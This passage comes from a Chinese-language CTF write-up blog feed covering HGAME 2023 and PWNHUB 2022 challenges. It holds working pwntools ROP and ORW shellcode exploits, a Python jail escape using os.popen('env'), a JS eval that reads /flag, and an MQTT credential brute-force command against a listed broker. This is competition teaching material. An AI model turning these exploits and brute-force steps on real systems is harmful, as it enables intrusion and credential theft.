class="line">base=leak-libc.sym.puts</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line">libc.address=base</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findGadget</span>(<span class="params">gadget</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">next</span>(libc.search(asm(gadget),executable=<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">bss_rop=<span class="number">0x404048</span></span><br><span class="line">bss_flag=<span class="number">0x404038</span></span><br><span class="line">leave_ret=<span class="number">0x4012EE</span></span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)+p64(bss_rop)+p64(findGadget(<span class="string">&#x27;pop rsi;ret&#x27;</span>))+p64(bss_rop)+p64(libc.sym.read)+p64(leave_ret)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(findGadget(<span class="string">&#x27;pop rsi;ret&#x27;</span>))+p64(bss_flag)+p64(libc.sym.read)</span><br><span class="line">pl+=p64(pop_rdi)+p64(bss_flag)+p64(findGadget(<span class="string">&#x27;pop rsi;ret&#x27;</span>))+p64(<span class="number">0</span>)+p64(libc.sym.<span class="built_in">open</span>) <span class="comment"># fd=open(&#x27;./flag&#x27;,0)  #3</span></span><br><span class="line">pl+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(findGadget(<span class="string">&#x27;pop rsi;ret&#x27;</span>))+p64(bss_rop)+p64(findGadget(<span class="string">&#x27;pop rdx;ret&#x27;</span>))+p64(<span class="number">0x30</span>)+p64(libc.sym.read) <span class="comment"># read(3,buf,0x100)</span></span><br><span class="line">pl+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(findGadget(<span class="string">&#x27;pop rsi;ret&#x27;</span>))+p64(bss_rop)+p64(findGadget(<span class="string">&#x27;pop rdx;ret&#x27;</span>))+p64(<span class="number">0x30</span>)+p64(libc.sym.write) <span class="comment"># puts(buf)</span></span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="simple-shellcode"><a href="#simple-shellcode" class="headerlink" title="simple_shellcode"></a>simple_shellcode</h3><blockquote><p>HINTS:</p><p>一次read不够多，为什么不再读一次呢？</p></blockquote><p>初看代码像ret2shellcode，但开启了沙盒禁用了 <code>execve()/execveat()</code>，而且 <code>read()</code> 只能读入0x10字节。</p><p>需要写入shellcode，但需先调用一次 <code>read()</code> 以读取更多的字节，再执行orw即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>,<span class="number">31331</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">pl = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xor rdi,rdi</span></span><br><span class="line"><span class="string">    mov rsi,rdx</span></span><br><span class="line"><span class="string">    mov rdx,0x100</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(pl))</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">pl = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">pl += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">pl += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">pl = asm(pl)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(pl))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(asm(shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x100</span>))))</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0xf</span>+pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Blockchain"><a href="#Blockchain" class="headerlink" title="Blockchain"></a>Blockchain</h2><h3 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h3><blockquote><p>题目中给出了三个端口，分别是 RPC、水龙头、题目交互端。 由于靶机端口随机，需要选手自行尝试。</p><p>其中，浏览器可直接访问的是水龙头，浏览器直接访问报 403 的是 RPC，浏览器无法访问的是题目交互端，需使用 nc 连接。</p></blockquote><p>nc连接，选1生成账号，在水龙头里转账后，选2生成合约地址，选4查看源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// contracts/checkin.sol</span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">contract Checkin &#123;</span><br><span class="line">    string greeting;</span><br><span class="line"></span><br><span class="line">    constructor(string memory _greeting)  &#123;</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function greet() public view returns (string memory) &#123;</span><br><span class="line">        return greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setGreeting(string memory _greeting) public &#123;</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (bool) &#123;</span><br><span class="line">        string memory expected = &quot;HelloHGAME!&quot;;</span><br><span class="line">        return keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码逻辑为通过 <code>setGreeting()</code> 传入字符串使得 <code>isSolved()</code> 返回 <code>true</code>，传入的字符串为 <code>HelloHGAME!</code> 即满足条件。</p><p>尝试在Remix中攻击已生成的合约地址没打通，问出题人知对Remix环境做了限制（防作弊），需采用web3py脚本方式进行攻击：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, HTTPProvider</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># RPC网络环境</span></span><br><span class="line">rpc = <span class="string">&#x27;&#x27;</span></span><br><span class="line">w3 = Web3(HTTPProvider(rpc))</span><br><span class="line"><span class="comment"># 检测连通性</span></span><br><span class="line"><span class="built_in">print</span>(w3.isConnected())</span><br><span class="line"></span><br><span class="line"><span class="comment"># Metamask地址</span></span><br><span class="line">myAccount = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 合约地址</span></span><br><span class="line">contractAddress = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># Metamask私钥</span></span><br><span class="line">private_key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># abi在Remix上编译.sol源码后获取</span></span><br><span class="line">abi = json.loads(<span class="string">&#x27;[&#123;&quot;inputs&quot;: [&#123;&quot;internalType&quot;: &quot;string&quot;,&quot;name&quot;: &quot;_greeting&quot;,&quot;type&quot;: &quot;string&quot;&#125;],&quot;stateMutability&quot;: &quot;nonpayable&quot;,&quot;type&quot;: &quot;constructor&quot;&#125;,&#123;&quot;inputs&quot;: [],&quot;name&quot;: &quot;greet&quot;,&quot;outputs&quot;: [&#123;&quot;internalType&quot;: &quot;string&quot;,&quot;name&quot;: &quot;&quot;,&quot;type&quot;: &quot;string&quot;&#125;],&quot;stateMutability&quot;: &quot;view&quot;,&quot;type&quot;: &quot;function&quot;&#125;,&#123;&quot;inputs&quot;: [],&quot;name&quot;: &quot;isSolved&quot;,&quot;outputs&quot;: [&#123;&quot;internalType&quot;: &quot;bool&quot;,&quot;name&quot;: &quot;&quot;,&quot;type&quot;: &quot;bool&quot;&#125;],&quot;stateMutability&quot;: &quot;view&quot;,&quot;type&quot;: &quot;function&quot;&#125;,&#123;&quot;inputs&quot;: [&#123;&quot;internalType&quot;: &quot;string&quot;,&quot;name&quot;: &quot;_greeting&quot;,&quot;type&quot;: &quot;string&quot;&#125;],&quot;name&quot;: &quot;setGreeting&quot;,&quot;outputs&quot;: [],&quot;stateMutability&quot;: &quot;nonpayable&quot;,&quot;type&quot;: &quot;function&quot;&#125;]&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取合约</span></span><br><span class="line">contract = w3.eth.contract(address=contractAddress, abi=abi)</span><br><span class="line">nonce = w3.eth.getTransactionCount(Web3.toChecksumAddress(myAccount))</span><br><span class="line"><span class="comment"># 合约交易定义，调用函数setGreeting</span></span><br><span class="line"><span class="comment"># 事先保证myAccount有足够ether支付gas*gasPrice+value，从水龙头获取ether</span></span><br><span class="line">tx = contract.functions.setGreeting(<span class="string">&#x27;HelloHGAME!&#x27;</span>).buildTransaction(&#123;</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: Web3.toChecksumAddress(myAccount),</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: w3.eth.gasPrice,</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: nonce,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">gas = w3.eth.estimate_gas(tx)</span><br><span class="line">tx[<span class="string">&#x27;gas&#x27;</span>] = gas</span><br><span class="line"><span class="built_in">print</span>(tx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 交易执行</span></span><br><span class="line">signed_txn = w3.eth.account.signTransaction(tx, private_key)</span><br><span class="line"><span class="built_in">print</span>(signed_txn.<span class="built_in">hash</span>)</span><br><span class="line"><span class="built_in">print</span>(signed_txn.rawTransaction)</span><br><span class="line"></span><br><span class="line">tmp =  w3.eth.sendRawTransaction(signed_txn.rawTransaction.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure><p>最后nc连接，选4获取flag。</p><p>​    </p><h2 id="Iot"><a href="#Iot" class="headerlink" title="Iot"></a>Iot</h2><h3 id="Help-marvin"><a href="#Help-marvin" class="headerlink" title="Help marvin"></a>Help marvin</h3><blockquote><p>兔兔发现售票的marvin只会吐出三个白头 决定去修一修marvin(-30)</p><p>HINTS:</p><p>Hint: SPI</p></blockquote><p>给定的是sr文件，解压，根据文件内容搜索知为逻辑分析套件sigrok生成的文件。</p><p>使用PulseView工具打开sr文件，在D0/D1/D2有数据，参考 <a href="https://blog.csdn.net/qq_42880719/article/details/123763744">2022DASCTF X SU 三月春季挑战赛 What’s In The Bits</a> 以及后放的提示，知符合SPI协议特征。</p><p>选择SPI解码器，clock选D0，输入选D2，导出所有解码的01字符：</p><p><code>00110100001100111011000010110110101100101011110110011010001011111001101010111010000110100011011100110011101100101010111110101001101110000001100010111110</code></p><p>去掉头位0，8位一组可还原字符串 <code>hgame&#123;4_5t4nge_Sp1&gt;</code>，修正最后一位补足一位1，得 <code>hgame&#123;4_5t4nge_Sp1&#125;</code>。</p><p>​    </p><h3 id="Help-the-uncle-who-can’t-jump-twice"><a href="#Help-the-uncle-who-can’t-jump-twice" class="headerlink" title="Help the uncle who can’t jump twice"></a>Help the uncle who can’t jump twice</h3><blockquote><p>兔兔在车站门口看到一张塑料凳子,上边坐着一个自称V的男人.他希望你能帮他登上他的大号 Vergil 去那边的公告栏上康康Nero手上的YAMATO怎么样了</p><p>broker:117.50.177.240:1883</p><p>HINTS:</p><p>Hint: mqtt</p></blockquote><p>根据broker地址知使用的MQTT协议，参考 <a href="https://zhuanlan.zhihu.com/p/581871896">物联网安全实战从零开始-MQTT协议分析</a> 安装mqtt-pwn。</p><p>使用命令爆破 Vergil 的密码，指定给定的密码本：</p><p><code>bruteforce --host 117.50.177.240 --port 1883 -u Vergil -pf password.txt</code></p><p>得到结果：</p><p><code>[+] Found valid credentials: Vergil:power</code></p><p>下载broker连接工具MQTT.fx，使用账密 <code>Vergil/power</code> 登录broker，在订阅处输入主题 <code>Nero/YAMATO</code>，收到包含flag的信息：<code>hgame&#123;mqtt_1s_p0w3r&#125;</code>。</p><p>​    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;HGAME 2023 将于 1 月 5 日 20:00 正式开始，祝大家玩得开心 :-)&lt;br&gt;线上赛平台：&lt;a href=&quot;https://hgame.vidar.club/&quot;&gt;https://hgame.vidar.club&lt;/a&gt;&lt;br&gt;请尽</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2023赛" scheme="https://lazzzaro.github.io/tags/2023%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>PWNHUB2022冬季赛</title>
    <link href="https://lazzzaro.github.io/2022/12/18/match-PWNHUB2022%E5%86%AC%E5%AD%A3%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2022/12/18/match-PWNHUB2022%E5%86%AC%E5%AD%A3%E8%B5%9B/</id>
    <published>2022-12-18T15:20:03.000Z</published>
    <updated>2022-12-20T10:40:05.641Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>✌️竞赛时间：12月17日 10:00—12月18日 22:00<br>✌️得分规则：比赛采用动态分数制度 ，每道题目的分值将根据解出队伍的数量进行动态记分。<br>✌️题目类型：Web、Pwn、Reverse、Misc、Crypto等</p><p><strong>Rank: 9</strong></p><hr><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="坐井观天"><a href="#坐井观天" class="headerlink" title="坐井观天"></a>坐井观天</h3><p>python逃逸，利用 <code>eval(input())</code> 绕过关键字黑名单：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;env&quot;</span>).read()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="证书里也有秘密"><a href="#证书里也有秘密" class="headerlink" title="证书里也有秘密"></a>证书里也有秘密</h3><p>xray证书信息解析，参考Github项目 <a href="https://github.com/net5/xray-crack">xray-crack</a>，将 <code>main.go</code> 编译：</p><p><code>go build -o goxray main.go</code></p><p>再运行：</p><p><code>./goxray -p xray-license.lic</code></p><p>即可得到证书内容数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">version ok: 2</span><br><span class="line">license parsed: &#123;bc5d237dc9b7470e94b61687c19e62fc 3270cdada4eb4a809d25ff4820d5a1f7 王德发 COMMUNITY-ADVANCED 1320981071 1645539742&#125;</span><br><span class="line">crypto/rsa: verification error</span><br></pre></td></tr></table></figure><p>故flag为user_id：<code>flag&#123;3270cdada4eb4a809d25ff4820d5a1f7&#125;</code>。</p><p>​    </p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="大杂烩"><a href="#大杂烩" class="headerlink" title="大杂烩"></a>大杂烩</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">padding = <span class="keyword">lambda</span> num, bit_len: (num &lt;&lt; (<span class="number">512</span> - bit_len)) + getrandbits(<span class="number">512</span> - bit_len)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;**************************************&#x27;</span></span><br><span class="line">m1, m2 = bytes_to_long(flag[:<span class="number">19</span>]), bytes_to_long(flag[<span class="number">19</span>:])</span><br><span class="line">p = next_prime(padding(m1, m1.bit_length()))</span><br><span class="line">q = next_prime(padding(m2, m2.bit_length()))</span><br><span class="line">n = p * q</span><br><span class="line">e = getPrime(<span class="number">128</span>)</span><br><span class="line">d = inverse(e, (p - <span class="number">1</span>) * (q-<span class="number">1</span>))</span><br><span class="line">a, b = e &amp; <span class="number">0x3ffffffffff</span>, e &gt;&gt; <span class="number">42</span></span><br><span class="line">N = getPrime(<span class="number">128</span>)</span><br><span class="line">E = EllipticCurve(Zmod(N), [a, b])</span><br><span class="line">NN = getPrime(<span class="number">1024</span>)</span><br><span class="line">S = inverse(getPrime(<span class="number">128</span>), NN) * inverse(getPrime(<span class="number">128</span>), NN)</span><br><span class="line">d1 = d &gt;&gt; <span class="number">512</span></span><br><span class="line">d2 = d &amp; (<span class="number">1</span> &lt;&lt; <span class="number">512</span>) - <span class="number">1</span></span><br><span class="line">enc1 = S * d1 % NN</span><br><span class="line">enc2 = S * d2 % NN</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a =&#x27;</span>, a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;N =&#x27;</span>, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;POINT =&#x27;</span>, E.lift_x(<span class="number">996</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;enc1 =&#x27;</span>, enc1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;enc2 =&#x27;</span>, enc2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;NN =&#x27;</span>, NN)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 117749279680045360245987277946945707343578937283621512842997606104123872211782263906911929773756533011817679794905642225389185861207256322349591633257348367854563703050789889773031032949742664695416275919382068347995088593380486820784360816053546651916291080971628354468517506190756456913824397593128781030749</span></span><br><span class="line"><span class="comment"># a = 1755716071599</span></span><br><span class="line"><span class="comment"># N = 236038564943567983056828121309828109017</span></span><br><span class="line"><span class="comment"># POINT = (996 : 151729833458737979764886336489671975339 : 1)</span></span><br><span class="line"><span class="comment"># enc1 = 98662590652068949920571979585725979127266112216583776160769090971169664292493813021843624362593669574513220457664819153878956311077379392531742253343961645534972639309537402874636739745717765969720117162780620981639015788423324884640935466801234207019510919768602974162878323777374364290185048275714332671356</span></span><br><span class="line"><span class="comment"># enc2 = 58738699705013897273174837829098879580829898980458718341881900446701910685043213698485036350888862454440118347362218485065377354137391792039111639199258042591959084091242821874819864955504791788260187064338245516327147327866373690756260239728218244294166383516151782123688633986853602732137707507845681977204</span></span><br><span class="line"><span class="comment"># NN = 149794788177729409820185150543033616327574456754306207341321223589733698623477041345453230785413920341465642754285280273761269552897080096162195035057667200692677841848045965505750839903359478511509753781737513122660495056746669041957643882516287304836822410136985711091802722010788615177574143908444311475347</span></span><br></pre></td></tr></table></figure></blockquote><p>$a,b$ 分别为 $e$ 的低42位和高(128-42)位，有 $e=2^{42}b+a$。</p><p>$a$ 已知，根据点 $P=(P_x,P_y)$ 及椭圆曲线 $E$ 方程 $y^2 \equiv x^3+ax+b \pmod N$，代入求解 $b$。</p><p>同理，$d=2^{512}d_1+d_2$，因 $c_1 = Sd_1 \bmod N’,c_2 = Sd_2 \bmod N’$，分别使用类似Wiener Attack的格子求解 $d_1,d_2$。</p><p>最后已知 $e,d,n$，分解 $n$ 得 $p,q$，flag两部分分别在 $p,q$ 中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">divide_pq</span>(<span class="params">e, d, n</span>):</span><br><span class="line">    k = e*d - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        g = random.randint(<span class="number">2</span>, n-<span class="number">1</span>)</span><br><span class="line">        t = k</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> t % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            t //= <span class="number">2</span></span><br><span class="line">            x = <span class="built_in">pow</span>(g, t, n)</span><br><span class="line">            <span class="keyword">if</span> x &gt; <span class="number">1</span> <span class="keyword">and</span> gmpy2.gcd(x-<span class="number">1</span>, n) &gt; <span class="number">1</span>:</span><br><span class="line">                p = gmpy2.gcd(x-<span class="number">1</span>, n)</span><br><span class="line">                <span class="keyword">return</span> (p, n//p)</span><br><span class="line"></span><br><span class="line">n = <span class="number">117749279680045360245987277946945707343578937283621512842997606104123872211782263906911929773756533011817679794905642225389185861207256322349591633257348367854563703050789889773031032949742664695416275919382068347995088593380486820784360816053546651916291080971628354468517506190756456913824397593128781030749</span></span><br><span class="line">a = <span class="number">1755716071599</span></span><br><span class="line">N = <span class="number">236038564943567983056828121309828109017</span></span><br><span class="line">Px, Py = (<span class="number">996</span>, <span class="number">151729833458737979764886336489671975339</span>)</span><br><span class="line">enc1 = <span class="number">98662590652068949920571979585725979127266112216583776160769090971169664292493813021843624362593669574513220457664819153878956311077379392531742253343961645534972639309537402874636739745717765969720117162780620981639015788423324884640935466801234207019510919768602974162878323777374364290185048275714332671356</span></span><br><span class="line">enc2 = <span class="number">58738699705013897273174837829098879580829898980458718341881900446701910685043213698485036350888862454440118347362218485065377354137391792039111639199258042591959084091242821874819864955504791788260187064338245516327147327866373690756260239728218244294166383516151782123688633986853602732137707507845681977204</span></span><br><span class="line">NN = <span class="number">149794788177729409820185150543033616327574456754306207341321223589733698623477041345453230785413920341465642754285280273761269552897080096162195035057667200692677841848045965505750839903359478511509753781737513122660495056746669041957643882516287304836822410136985711091802722010788615177574143908444311475347</span></span><br><span class="line"></span><br><span class="line">F = Zmod(N)</span><br><span class="line">b = <span class="built_in">int</span>(F(Py^<span class="number">2</span> - (Px^<span class="number">3</span> + a*Px)))</span><br><span class="line">e = <span class="number">2</span>^<span class="number">42</span> * b + a</span><br><span class="line"></span><br><span class="line">L1 = Matrix(ZZ, [[enc1, <span class="number">2</span>^<span class="number">256</span>],[NN, <span class="number">0</span>]])</span><br><span class="line">d1 = -L1.LLL()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">L2 = Matrix(ZZ, [[enc2, <span class="number">2</span>^<span class="number">256</span>],[NN, <span class="number">0</span>]])</span><br><span class="line">d2 = -L2.LLL()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">d = <span class="number">2</span>^<span class="number">512</span> * d1 + d2</span><br><span class="line"></span><br><span class="line">p, q = divide_pq(e, d, n)</span><br><span class="line">flag1 = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(p&gt;&gt;(<span class="number">512</span>-<span class="number">19</span>*<span class="number">8</span>+<span class="number">2</span>))[<span class="number">2</span>:])</span><br><span class="line">flag2 = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(q&gt;&gt;(<span class="number">512</span>-<span class="number">19</span>*<span class="number">8</span>+<span class="number">1</span>))[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(flag1)</span><br><span class="line"><span class="built_in">print</span>(flag2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;4cb201080d8b240774&#125;&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;e89f47939d1243&#x27;</span></span><br></pre></td></tr></table></figure><p>flag：<code>flag&#123;e89f47939d12434cb201080d8b240774&#125;</code>。</p><p>​    </p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="justJS"><a href="#justJS" class="headerlink" title="justJS"></a>justJS</h3><p>js命令执行即可：</p><p><code>eval(read(&quot;/flag&quot;))</code></p><p>在 <code>eval()</code> 的报错文字中得到flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">undefined:1: SyntanError: Unexpected token &#x27;&#123;&#x27;</span><br><span class="line">flag&#123;5cff08f23eb37451bd84effb99275794&#125;</span><br><span class="line">    ^</span><br><span class="line">SyntanError: Unexpected token &#x27;&#123;&#x27;</span><br><span class="line">    at input.js:1:6</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="ppc"><a href="#ppc" class="headerlink" title="ppc"></a>ppc</h2><h3 id="Tcp-Show"><a href="#Tcp-Show" class="headerlink" title="Tcp Show"></a>Tcp Show</h3><blockquote><p><strong>Description</strong></p><p>众所周知，Wireshark 带有一个 follow tcp stream 功能，可以展示 TCP 流量的来回通信。</p><p>为了给某产品增加显示 TCP 来回流量的功能，你准备读取流量文件来生成类似的展示效果。</p><p><strong>Input</strong></p><p>第一行输入一个数字 N，表示接下来有 N 行。</p><p>接下来 N 行，每一行都由两部分组成。首先是一个数字 D，数字 D 为 0 表示为客户端发给服务器的方向，数字 D 为 1 表示服务器发给客户端方向；然后第二部分是一个 base64 字符串，表示编码后的流量具体内容。</p><p><strong>Output</strong></p><p>对于每一行的流量包，生成类似 wireshark 的 hexdump 模式的流量展示。其中：</p><ol><li><p>每行开头都是 8 位 